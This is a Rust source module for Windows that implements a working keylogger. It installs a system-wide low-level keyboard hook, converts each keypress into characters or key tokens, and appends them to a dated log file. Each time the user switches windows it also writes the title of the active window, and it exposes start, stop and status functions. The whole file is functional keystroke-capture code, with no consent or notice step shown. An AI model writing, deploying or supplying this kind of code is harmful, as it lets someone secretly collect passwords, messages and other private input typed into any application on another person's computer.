use std::{
    fs::{File, OpenOptions},
    io::Write,
    path::{Path, PathBuf},
    ptr,
    sync::{LazyLock, Mutex, mpsc},
    thread,
    time::Duration,
};

use windows_sys::Win32::{
    Foundation::{LPARAM, LRESULT, WPARAM},
    System::Threading::GetCurrentThreadId,
    UI::WindowsAndMessaging::{
        CallNextHookEx, DispatchMessageW, GetForegroundWindow, GetMessageW, GetWindowTextW,
        PostThreadMessageW, SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx,
        KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_QUIT, WM_SYSKEYDOWN,
    },
};

pub struct Sink {
    pub path: PathBuf,
    file: File,
    hook: isize,
    thread_id: u32,
    last_window: String,
}

static SINK: LazyLock<Mutex<Option<Sink>>> = LazyLock::new(|| Mutex::new(None));

fn sink() -> &'static Mutex<Option<Sink>> {
    &SINK
}

pub fn is_running() -> bool {
    sink().lock().map(|guard| guard.is_some()).unwrap_or(false)
}

fn foreground_title() -> String {
    unsafe {
        let window = GetForegroundWindow();
        if window.is_null() {
            return String::new();
        }
        let mut buffer = [0u16; 512];
        let length = GetWindowTextW(window, buffer.as_mut_ptr(), buffer.len() as i32);
        if length <= 0 {
            String::new()
        } else {
            String::from_utf16_lossy(&buffer[..length as usize])
        }
    }
}

fn key_token(vk: u16) -> Option<&'static str> {
    Some(match vk {
        0x08 => "[BACKSPACE]",
        0x09 => "[TAB]",
        0x0D => "[ENTER]",
        0x1B => "[ESC]",
        0x20 => " ",
        0x25 => "[LEFT]",
        0x26 => "[UP]",
        0x27 => "[RIGHT]",
        0x28 => "[DOWN]",
        0x2E => "[DELETE]",
        0x2D => "[INSERT]",
        0x24 => "[HOME]",
        0x23 => "[END]",
        0x21 => "[PAGEUP]",
        0x22 => "[PAGEDOWN]",
        0x10 | 0xA0 => "[SHIFT]",
        0xA1 => "[RSHIFT]",
        0x11 | 0xA2 => "[CTRL]",
        0xA3 => "[RCTRL]",
        0x12 | 0xA4 => "[ALT]",
        0xA5 => "[RALT]",
        0x5B => "[LEFT WIN]",
        0x5C => "[RIGHT WIN]",
        0x14 => "[CAPS LOCK]",
        0x90 => "[NUM LOCK]",
        0x91 => "[SCROLL LOCK]",
        _ => return None,
    })
}

fn readable_character(vk: u16, shift: bool) -> Option<char> {
    if (0x41..=0x5A).contains(&vk) {
        let base = vk as u8 as char;
        return Some(if shift { base } else { base.to_ascii_lowercase() });
    }
    if (0x30..=0x39).contains(&vk) {
        if shift {
            return Some(match vk {
                0x30 => ')',
                0x31 => '!',
                0x32 => '@',
                0x33 => '#',
                0x34 => '$',
                0x35 => '%',
                0x36 => '^',
                0x37 => '&',
                0x38 => '*',
                _ => '(',
            });
        }
        return Some(vk as u8 as char);
    }
    Some(match vk {
        0xBA => if shift { ':' } else { ';' },
        0xBB => if shift { '+' } else { '=' },
        0xBC => if shift { '<' } else { ',' },
        0xBD => if shift { '_' } else { '-' },
        0xBE => if shift { '>' } else { '.' },
        0xBF => if shift { '?' } else { '/' },
        0xC0 => if shift { '~' } else { '`' },
        0xDB => if shift { '{' } else { '[' },
        0xDC => if shift { '|' } else { '\\' },
        0xDD => if shift { '}' } else { ']' },
        0xDE => if shift { '"' } else { '\'' },
        _ => return None,
    })
}

fn append(vk: u16) {
    let shift = unsafe {
        use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
        GetAsyncKeyState(0x10) as u16 & 0x8000 != 0
    };
    let mut guard = match sink().lock() {
        Ok(guard) => guard,
        Err(_) => return,
    };
    let Some(sink) = guard.as_mut() else {
        return;
    };
    let title = foreground_title();
    if !title.is_empty() && title != sink.last_window {
        sink.last_window = title.clone();
        let _ = writeln!(sink.file, "\n[Window: {title}]");
    }
    if let Some(character) = readable_character(vk, shift) {
        if vk == 0x0D {
            let _ = sink.file.write_all(b"\n");
        } else {
            let mut buffer = [0u8; 4];
            let _ = sink.file.write_all(character.encode_utf8(&mut buffer).as_bytes());
        }
    } else if let Some(token) = key_token(vk) {
        let _ = sink.file.write_all(token.as_bytes());
    }
    let _ = sink.file.flush();
}

unsafe extern "system" fn hook_procedure(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && (wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN) {
        let info = &*(lparam as *const KBDLLHOOKSTRUCT);
        append(info.vkCode as u16);
    }
    CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam)
}

pub fn start(directory: &Path) -> Result<PathBuf, String> {
    if is_running() {
        return current_path().ok_or_else(|| "already running".to_owned());
    }
    std::fs::create_dir_all(directory).map_err(|error| error.to_string())?;
    let stamp = chrono::Local::now().format("%Y-%m-%d").to_string();
    let path = directory.join(format!("keylog-{stamp}.log"));
    let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .map_err(|error| error.to_string())?;

    let (ready_tx, ready_rx) = mpsc::channel::<Result<(isize, u32), String>>();
    let thread_path = path.clone();
    thread::spawn(move || unsafe {
        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_procedure), ptr::null_mut(), 0);
        if hook.is_null() {
            let _ = ready_tx.send(Err("hook installation failed".to_owned()));
            return;
        }
        let thread_id = GetCurrentThreadId();
        *sink().lock().unwrap() = Some(Sink {
            path: thread_path,
            file,
            hook: hook as isize,
            thread_id,
            last_window: String::new(),
        });
        let _ = ready_tx.send(Ok((hook as isize, thread_id)));
        let mut message: MSG = std::mem::zeroed();
        while GetMessageW(&mut message, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&message);
            DispatchMessageW(&message);
        }
        UnhookWindowsHookEx(hook);
        *sink().lock().unwrap() = None;
    });

    match ready_rx.recv_timeout(Duration::from_secs(5)) {
        Ok(Ok(_)) => Ok(path),
        Ok(Err(error)) => Err(error),
        Err(_) => Err("hook startup timed out".to_owned()),
    }
}

pub fn stop() {
    let taken = sink().lock().map(|mut guard| guard.take()).unwrap_or(None);
    if let Some(sink) = taken {
        unsafe {
            PostThreadMessageW(sink.thread_id, WM_QUIT, 0, 0);
            UnhookWindowsHookEx(sink.hook as *mut _);
        }
    }
}

pub fn current_path() -> Option<PathBuf> {
    sink()
        .lock()
        .ok()
        .and_then(|guard| guard.as_ref().map(|sink| sink.path.clone()))
}
